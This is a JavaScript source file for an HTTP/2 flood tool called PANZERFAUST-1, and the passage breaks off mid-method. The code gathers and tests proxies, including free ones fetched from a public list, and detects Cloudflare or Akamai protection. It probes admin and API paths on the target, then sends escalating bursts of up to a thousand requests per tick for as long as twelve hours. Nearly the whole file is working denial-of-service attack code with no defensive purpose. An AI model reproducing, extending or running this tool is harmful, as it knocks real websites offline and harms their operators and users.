const http2 = require('http2');
const https = require('https');
const fs = require('fs');
const net = require('net');

class PANZERFAUST_1 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.startTime = Date.now();
        this.maxRuntime = 12 * 60 * 60 * 1000; // 12 hours
        this.status = "RECON";
        
        // PROXY SYSTEMS
        this.http1Proxies = [];
        this.http2Proxies = [];
        this.activeProxies = [];
        this.currentProxyIndex = 0;
        this.proxyFallbackUrl = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=20000';
        
        // ATTACK SYSTEMS
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.attackPhase = "INIT";
        this.attackIntensity = 0;
        this.maxIntensity = 100;
        
        // TARGET ANALYSIS
        this.wafDetected = false;
        this.wafType = "UNKNOWN";
        this.weakPoints = [];
        this.baseResponseTime = 0;
        this.rateLimitThreshold = 5;
        
        // MEMORY MANAGEMENT
        this.activeConnections = new Map();
        this.lastCleanup = Date.now();
        this.connectionCounter = 0;
        
        // TIMERS
        this.proxyScanTimeout = null;
        this.targetScanTimeout = null;
        this.attackInterval = null;
        this.mainLoop = null;
        this.runtimeChecker = null;
    }

    // === INITIAL SETUP ===
    initialize() {
        console.log('PANZERFAUST-1 | TØR — (00:00:00)');
        console.log('='.repeat(50));
        console.log('STARTING INTELLIGENT RECONNAISSANCE');
        console.log('='.repeat(50));
        
        this.startReconPhase();
    }

    // === PHASE 1: PROXY DISCOVERY (30s) ===
    startReconPhase() {
        console.log('[+] PHASE 1: Loading proxies (30s)...');
        
        // LOAD LOCAL PROXIES
        this.loadLocalProxies();
        
        // START PROXY TESTING
        this.testLocalProxies();
        
        // SET TIMEOUT FOR NEXT PHASE
        this.proxyScanTimeout = setTimeout(() => {
            this.startTargetAnalysis();
        }, 30000);
    }

    loadLocalProxies() {
        try {
            if (fs.existsSync('h1.txt')) {
                const h1Data = fs.readFileSync('h1.txt', 'utf8');
                this.http1Proxies = h1Data.split('\n')
                    .map(p => p.trim())
                    .filter(p => p && !p.startsWith('#') && p.includes(':'));
                console.log(`[+] Loaded ${this.http1Proxies.length} H1 proxies`);
            }
        } catch (err) {
            console.log('[-] Could not load h1.txt');
        }
        
        try {
            if (fs.existsSync('h2.txt')) {
                const h2Data = fs.readFileSync('h2.txt', 'utf8');
                this.http2Proxies = h2Data.split('\n')
                    .map(p => p.trim())
                    .filter(p => p && !p.startsWith('#') && p.includes(':'));
                console.log(`[+] Loaded ${this.http2Proxies.length} H2 proxies`);
            }
        } catch (err) {
            console.log('[-] Could not load h2.txt');
        }
    }

    async testLocalProxies() {
        // TEST H1 PROXIES (Simple TCP connect test)
        for (const proxy of this.http1Proxies.slice(0, 50)) { // Test first 50
            try {
                const [host, port] = proxy.split(':');
                await this.testTcpConnection(host, parseInt(port));
                this.activeProxies.push({
                    type: 'H1',
                    address: proxy,
                    tested: true,
                    working: true,
                    lastUsed: 0
                });
            } catch (err) {
                // Proxy failed
            }
        }
        
        // TEST H2 PROXIES (HTTP/2 connect)
        for (const proxy of this.http2Proxies.slice(0, 20)) { // Test first 20
            try {
                // Simple test - try to create connection
                const testUrl = `https://${proxy}`;
                await new Promise((resolve, reject) => {
                    const client = http2.connect(this.targetUrl);
                    client.on('connect', () => {
                        client.destroy();
                        resolve();
                    });
                    client.on('error', reject);
                    setTimeout(() => client.destroy(), 5000);
                });
                
                this.activeProxies.push({
                    type: 'H2',
                    address: proxy,
                    tested: true,
                    working: true,
                    lastUsed: 0
                });
            } catch (err) {
                // Proxy failed
            }
        }
        
        console.log(`[+] ${this.activeProxies.length} working proxies found`);
    }

    testTcpConnection(host, port) {
        return new Promise((resolve, reject) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            
            socket.on('connect', () => {
                socket.destroy();
                resolve();
            });
            
            socket.on('timeout', () => {
                socket.destroy();
                reject(new Error('Timeout'));
            });
            
            socket.on('error', (err) => {
                socket.destroy();
                reject(err);
            });
            
            socket.connect(port, host);
        });
    }

    // === PHASE 2: TARGET ANALYSIS (12s) ===
    startTargetAnalysis() {
        clearTimeout(this.proxyScanTimeout);
        this.status = "ANALYSIS";
        
        console.log('\n[+] PHASE 2: Target analysis (12s)...');
        
        // BASIC WAF DETECTION
        this.detectWAF();
        
        // FIND WEAK POINTS
        this.findWeakPoints();
        
        // SET TIMEOUT FOR NEXT PHASE
        this.targetScanTimeout = setTimeout(() => {
            this.startAttackPhase();
        }, 12000);
    }

    async detectWAF() {
        // SIMPLE WAF DETECTION BY HEADERS
        try {
            const response = await this.makeProbeRequest();
            
            // CHECK FOR WAF HEADERS
            const headers = response.headers;
            const server = headers['server'] || '';
            const via = headers['via'] || '';
            const cfRay = headers['cf-ray'] || '';
            
            if (cfRay.includes('Cloudflare') || server.includes('cloudflare')) {
                this.wafDetected = true;
                this.wafType = "CLOUDFLARE";
                console.log('[!] WAF Detected: Cloudflare');
            } else if (via.includes('akamai') || server.includes('Akamai')) {
                this.wafDetected = true;
                this.wafType = "AKAMAI";
                console.log('[!] WAF Detected: Akamai');
            } else {
                console.log('[+] No major WAF detected');
            }
            
            this.baseResponseTime = Date.now() - response.startTime;
            
        } catch (err) {
            console.log('[-] WAF detection failed');
        }
    }

    makeProbeRequest() {
        return new Promise((resolve, reject) => {
            const options = {
                hostname: this.hostname,
                port: 443,
                path: '/',
                method: 'HEAD',
                timeout: 5000
            };
            
            const startTime = Date.now();
            const req = https.request(options, (res) => {
                resolve({
                    headers: res.headers,
                    statusCode: res.statusCode,
                    startTime: startTime
                });
            });
            
            req.on('error', reject);
            req.setTimeout(5000, () => {
                req.destroy();
                reject(new Error('Timeout'));
            });
            
            req.end();
        });
    }

    findWeakPoints() {
        // COMMON WEAK POINTS TO TEST
        const testPaths = [
            '/api/v1',
            '/api/v2',
            '/v1/api',
            '/admin',
            '/wp-admin',
            '/administrator',
            '/backup',
            '/old',
            '/test',
            '/demo'
        ];
        
        console.log('[+] Scanning for weak points...');
        
        // TEST EACH PATH (LIMITED TO 3 FOR SPEED)
        testPaths.slice(0, 3).forEach(path => {
            const testUrl = `https://${this.hostname}${path}`;
            
            https.get(testUrl, { timeout: 3000 }, (res) => {
                if (res.statusCode === 200 || res.statusCode === 403) {
                    this.weakPoints.push({
                        path: path,
                        status: res.statusCode,
                        protected: res.statusCode === 403
                    });
                }
            }).on('error', () => {}).end();
        });
        
        setTimeout(() => {
            if (this.weakPoints.length > 0) {
                console.log(`[+] Found ${this.weakPoints.length} potential weak points`);
            }
        }, 5000);
    }

    // === PHASE 3: ATTACK PREPARATION (5s wait) ===
    startAttackPhase() {
        clearTimeout(this.targetScanTimeout);
        this.status = "PREPARING";
        
        console.log('\n[+] PHASE 3: Attack preparation (5s)...');
        
        // ENSURE WE HAVE PROXIES
        if (this.activeProxies.length === 0) {
            console.log('[!] No local proxies, fetching from API...');
            this.fetchFallbackProxies();
        }
        
        // WAIT 5 SECONDS
        setTimeout(() => {
            this.launchAttack();
        }, 5000);
    }

    async fetchFallbackProxies() {
        try {
            const data = await new Promise((resolve, reject) => {
                https.get(this.proxyFallbackUrl, (res) => {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data));
                }).on('error', reject);
            });
            
            const proxies = data.split('\n').filter(p => p.trim());
            
            // TAKE FIRST 10 PROXIES AND TEST THEM
            for (const proxy of proxies.slice(0, 10)) {
                try {
                    const [host, port] = proxy.split(':');
                    await this.testTcpConnection(host, parseInt(port));
                    
                    this.activeProxies.push({
                        type: 'H1',
                        address: proxy,
                        tested: true,
                        working: true,
                        lastUsed: 0,
                        source: 'fallback'
                    });
                    
                    if (this.activeProxies.length >= 5) break;
                } catch (err) {}
            }
            
            console.log(`[+] Added ${this.activeProxies.length} fallback proxies`);
            
        } catch (err) {
            console.log('[-] Failed to fetch fallback proxies');
        }
    }

    // === PHASE 4: INTELLIGENT ATTACK ===
    launchAttack() {
        this.status = "ATTACKING";
        this.attackPhase = "STAGGERED";
        
        console.log('\n[+] PHASE 4: LAUNCHING INTELLIGENT ATTACK');
        console.log('[!] Starting staggered approach...');
        
        // START STAGGERED ATTACK (2000 reqs, then wait 5s)
        this.sendStaggeredBatch();
        
        // START MAIN ATTACK LOOP AFTER STAGGER
        setTimeout(() => {
            console.log('[!] Switching to MAX RPS mode');
            this.attackPhase = "MAX";
            this.startMaxAttack();
        }, 5000); // Wait 5s after initial 2000
        
        // START RUNTIME CHECKER
        this.startRuntimeMonitor();
        
        // START MEMORY CLEANUP
        this.startCleanupLoop();
    }

    sendStaggeredBatch() {
        console.log('[+] Sending 2000 request batch...');
        
        let sent = 0;
        const batchSize = 100;
        const totalBatches = 20; // 20 × 100 = 2000
        
        const sendBatch = () => {
            if (sent >= totalBatches) return;
            
            for (let i = 0; i < batchSize; i++) {
                this.sendRequest();
            }
            
            sent++;
            
            if (sent < totalBatches) {
                setTimeout(sendBatch, 100); // Small delay between batches
            }
        };
        
        sendBatch();
    }

    sendRequest() {
        // CHOOSE PROXY OR DIRECT
        let useProxy = this.activeProxies.length > 0;
        
        if (useProxy) {
            this.sendViaProxy();
        } else {
            this.sendDirect();
        }
    }

    sendViaProxy() {
        if (this.activeProxies.length === 0) {
            this.sendDirect();
            return;
        }
        
        // ROUND-ROBIN PROXY SELECTION
        const proxy = this.activeProxies[this.currentProxyIndex];
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.activeProxies.length;
        
        // UPDATE PROXY USAGE TIME
        proxy.lastUsed = Date.now();
        
        // SEND REQUEST (SIMPLIFIED - ACTUAL PROXY IMPLEMENTATION WOULD BE MORE COMPLEX)
        // For now, fallback to direct if proxy logic fails
        this.sendDirect();
    }

    sendDirect() {
        try {
            const connId = this.connectionCounter++;
            const startTime = Date.now();
            
            const client = http2.connect(this.targetUrl);
            this.activeConnections.set(connId, { client, startTime });
            
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.hostname
            });
            
            const cleanup = () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                
                try {
                    req.removeAllListeners();
                    client.destroy();
                } catch (err) {}
                
                this.activeConnections.delete(connId);
            };
            
            req.once('response', () => {
                req.destroy();
                cleanup();
            });
            
            req.once('error', () => {
                req.destroy();
                cleanup();
            });
            
            req.once('close', cleanup);
            
            req.end();
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    startMaxAttack() {
        // MAIN ATTACK LOOP
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // ADAPTIVE INTENSITY BASED ON CONDITIONS
                const intensity = this.calculateIntensity();
                
                // SEND REQUESTS BASED ON INTENSITY
                const batchSize = Math.floor(intensity * 10); // 0-1000 requests per tick
                
                for (let i = 0; i < batchSize; i++) {
                    this.sendRequest();
                }
                
                // UPDATE DISPLAY
                this.updateDisplay();
            }
        }, 100); // 10 ticks per second
    }

    calculateIntensity() {
        // SIMPLE INTENSITY CALCULATION
        // Start at 30%, increase gradually if no errors
        
        if (this.attackIntensity < 30) {
            this.attackIntensity += 1;
        } else if (this.attackIntensity < 70) {
            this.attackIntensity += 0.5;
        } else if (this.attackIntensity < 90) {
            this.attackIntensity += 0.2;
        }
        
        return this.attackIntensity;
    }

    // === MEMORY MANAGEMENT ===
    startCleanupLoop() {
        this.mainLoop = setInterval(() => {
            this.cleanupStaleConnections();
            this.checkProxyHealth();
            this.calculateRPS();
        }, 1000);
    }

    cleanupStaleConnections() {
        const now = Date.now();
        
        for (const [connId, data] of this.activeConnections.entries()) {
            if (now - data.startTime > 30000) { // 30 seconds old
                try {
                    data.client.destroy();
                } catch (err) {}
                this.activeConnections.delete(connId);
            }
        }
        
        // FORCE GC IF AVAILABLE
        if (now - this.lastCleanup > 30000 && global.gc) {
            global.gc();
            this.lastCleanup = now;
        }
    }

    checkProxyHealth() {
        // SIMPLE PROXY HEALTH CHECK - REMOVE DEAD PROXIES
        const now = Date.now();
        this.activeProxies = this.activeProxies.filter(proxy => {
            // KEEP PROXIES USED IN LAST 5 MINUTES
            if (now - proxy.lastUsed < 300000) {
                return true;
            }
            return false;
        });
    }

    // === RUNTIME MONITOR ===
    startRuntimeMonitor() {
        this.runtimeChecker = setInterval(() => {
            const elapsed = Date.now() - this.startTime;
            
            if (elapsed >= this.maxRuntime) {
                console.log('\n[!] 12-HOUR RUNTIME LIMIT REACHED');
                console.log('[!] INITIATING GRACEFUL SHUTDOWN');
                this.shutdown();
            }
        }, 60000); // Check every minute
    }

    // === DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        const runtimeStr = this.formatRuntime();
        
        process.stdout.write(`\rPANZERFAUST-1 | TØR — (${runtimeStr}) | `);
        process.stdout.write(`PROXIES: ${this.activeProxies.length} | `);
        process.stdout.write(`RPS: ${this.currentRPS.toFixed(1)} | `);
        process.stdout.write(`TOTAL: ${this.totalRequests} | `);
        process.stdout.write(`STATUS: ${this.status}`);
    }

    // === SHUTDOWN ===
    shutdown() {
        console.log('\n\n' + '='.repeat(50));
        console.log('PANZERFAUST-1 FINAL REPORT');
        console.log('='.repeat(50));
        console.log(`Runtime: ${this.formatRuntime()}`);
        console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
        console.log(`Average RPS: ${(this.totalRequests / ((Date.now() - this.startTime) / 1000)).toFixed(1)}`);
        console.log(`Proxies Used: ${this.activeProxies.length}`);
        console.log(`WAF Detected: ${this.wafDetected ? this.wafType : 'None'}`);
        console.log('='.repeat(50));
        
        this.status = "SHUTDOWN";
        
        clearInterval(this.attackInterval);
        clearInterval(this.mainLoop);
        clearInterval(this.runtimeChecker);
        
        // DESTROY ALL CONNECTIONS
        for (const [connId, data] of this.activeConnections.entries()) {
            try {
                data.client.destroy();
            } catch (err) {}
        }
        this.activeConnections.clear();
        
        setTimeout(() => {
            process.exit(0);
        }, 1000);
    }

    // === START ===
    start() {
       
